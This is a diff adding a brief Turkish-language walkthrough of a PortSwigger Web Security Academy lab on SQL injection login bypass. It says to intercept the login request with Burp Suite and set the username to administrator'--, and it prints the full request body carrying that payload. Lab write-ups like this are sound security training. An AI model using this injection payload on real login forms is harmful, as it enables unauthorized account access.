@@ -1,0 +1,8 @@
+LAB: SQL injection vulnerability allowing login bypass
+
+1 - Login sayfasina gidiyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/login
+
+2 - Burp Suite ile isteği yaklayarak username parametresini administrator'-- ile değiştiriyoruz.
+
+csrf=ASDAAS&username=administrator'--&password=b
